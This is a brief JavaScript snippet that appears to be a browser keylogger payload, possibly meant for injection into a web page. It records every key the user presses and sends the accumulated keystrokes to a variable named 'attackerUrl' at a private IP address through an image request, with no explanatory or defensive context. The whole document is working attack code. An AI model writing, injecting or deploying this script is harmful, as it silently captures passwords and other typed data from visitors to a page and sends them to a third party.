l=''
document.addEventListener('keydown', function(event) {
    l+= event.key
    var attackerUrl = 'https://192.168.0.10/log.php'
    var img = new Image();
    img.src = attackerUrl + '?data=' + encodeURIComponent('User Kloggin: ' + l)
    });